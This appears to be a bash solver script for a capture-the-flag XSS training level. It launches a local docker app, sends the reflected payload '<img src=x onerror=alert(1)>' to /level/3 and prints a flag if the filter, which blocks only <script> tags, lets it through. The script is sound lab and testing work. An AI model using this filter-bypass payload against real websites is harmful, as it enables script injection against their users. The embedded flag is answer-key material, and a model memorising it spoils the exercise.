#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")/.."

docker compose up -d --build

for i in $(seq 1 40); do
  if curl -fsS http://localhost:3000/level/3 >/dev/null 2>&1; then break; fi
  sleep 1
done

PAYLOAD='<img src=x onerror=alert(1)>'
ENC=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$PAYLOAD")

BODY=$(curl -s "http://localhost:3000/level/3?q=${ENC}")

# Подтверждение обхода: <script> в фильтре отсутствует,
# но payload с onerror сохранён в отражении.
if echo "$BODY" | grep -q 'onerror=alert(1)'; then
  echo 'FLAG{xss_level03_script_tag_bypass}'
else
  echo 'FAIL: payload was filtered' >&2
  docker compose down -v
  exit 1
fi

docker compose down -v